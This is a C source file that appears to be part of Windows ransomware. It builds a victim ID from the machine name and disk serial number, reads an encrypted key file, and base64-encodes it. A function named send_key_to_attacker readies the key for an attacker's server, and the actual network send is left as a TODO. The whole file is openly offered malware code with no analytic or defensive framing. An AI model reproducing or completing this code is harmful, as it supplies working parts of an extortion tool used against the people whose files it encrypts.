#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>

#include "mbedtls/base64.h"

/* Generate victim ID using computer name and volume serial number */
static int generate_victim_id(char *victim_id, size_t id_size) {
    char comp_name[256];
    DWORD name_len = sizeof(comp_name);
    DWORD serial_num = 0;
    
    // check if buffer is big enough
    if (!victim_id || id_size < 64) {
        fprintf(stderr, "Buffer too small\n");
        return -1;
    }
    
    // get computer name
    if (!GetComputerNameA(comp_name, &name_len)) {
        // if it fails use "PC" as default
        strcpy(comp_name, "PC");
    }
    
    // get the C drive serial number
    if (!GetVolumeInformationA("C:\\", NULL, 0, &serial_num, NULL, NULL, NULL, 0)) {
        fprintf(stderr, "Could not get drive serial number");
        return -1;
    }
    
    // combine them "comp_name-hex_serial_num"
    snprintf(victim_id, id_size, "%s-%08lX", comp_name, serial_num);
    
    return 0;
}


/* Read the encrypted key file */
static int read_encrypted_key_file(const char *key_file, 
                                    unsigned char **key_data, 
                                    size_t *key_size) {
    long file_size = 0;

    if (!key_file || !key_data || !key_size) {
        fprintf(stderr, "Invalid parameters\n");
        return -1;
    }
    
    // open file
    FILE *file = fopen(key_file, "rb");
    if (!file) {
        fprintf(stderr, "Failed to open file\n");
        return -1;
    }
    
    // get file size
    fseek(file, 0, SEEK_END);
    file_size = ftell(file);
    
    if (file_size == 0) {
        fclose(file);
        fprintf(stderr, "File is empty\n");
        return -1;
    }
    
    // allocate memory
    unsigned char *file_data = malloc(file_size);
    
    // read file
    fseek(file, 0, SEEK_SET); // go back to beginning as previously the pointer was moved
    if (fread(file_data, 1, file_size, file) != file_size) {
        free(file_data);
        fclose(file);
        fprintf(stderr, "Failed to read file\n");
        return -1;
    }
    
    fclose(file);
    
    // return key and its size
    *key_data = file_data;
    *key_size = file_size;
    
    return 0;
}

/* Convert binary data to base64 as we will send key to the attacker's server in a JSON */
static int base64_encode(const unsigned char *bin_input, 
                             size_t bin_input_len,
                             char **base64_output, 
                             size_t *base64_output_len) {
    size_t written = 0;
    
    if (!bin_input || !base64_output || !base64_output_len || bin_input_len == 0) {
        fprintf(stderr, "Invalid parameters\n");
        return -1;  
    }
    
    // calculate buffer size needed - mbedtls call with dst buffer = NULL and its len = 0
    size_t buffer_size = 0;
    mbedtls_base64_encode(NULL, 0, &buffer_size, bin_input, bin_input_len);
    
    // allocate buffer
    unsigned char *buffer = malloc(buffer_size);
    
    // encode to base64 using mbedtls
    if (mbedtls_base64_encode(buffer, buffer_size, &written, bin_input, bin_input_len) != 0) {
        free(buffer);
        fprintf(stderr, "Failed to encode to base64\n");
        return -1;
    }

    buffer[written] = '\0';

    // return string in base64 and its len
    *base64_output = (char *)buffer;
    *base64_output_len = written;
    
    return 0;
}

/* Send encrypted key to attacker's server */
static int send_key_to_attacker(const char *key_file) {

    // generate victim ID
    char victim_id[64];
    if (generate_victim_id(victim_id, sizeof(victim_id)) != 0) {
        return -1;
    }

    // read encrypted key from file
    unsigned char *key_data = NULL;
    size_t key_size = 0;
    if (read_encrypted_key_file(key_file, &key_data, &key_size) != 0) {
        return -1;
    }

    // encode key to base64
    char *base64_key = NULL;
    size_t base64_len = 0;
    if (base64_encode(key_data, key_size, &base64_key, &base64_len) != 0) {
        free(key_data); // free key data if encoding fails
        return -1;
    }

    // TODO send key to attacker's server through api request

    // cleanup
    free(key_data);
    free(base64_key);

    return 0; // TODO change to return result of sending key to attacker's server when implemented
}